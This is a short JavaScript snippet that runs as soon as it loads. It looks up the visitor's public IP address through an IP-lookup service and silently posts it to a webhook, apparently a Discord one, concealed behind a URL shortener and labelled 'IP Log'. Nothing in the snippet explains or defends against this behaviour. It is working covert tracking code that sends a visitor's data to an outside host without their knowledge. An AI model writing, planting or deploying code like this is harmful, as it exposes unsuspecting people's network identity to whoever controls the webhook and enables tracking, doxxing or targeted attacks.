var webHookUrl = "https://tinyurl.com/4wnnjtra";
const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://ip.aruljohn.com/');
    const data = await response.text();

   
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content: data
    }

    postRequest.send(JSON.stringify(params));

}

request();
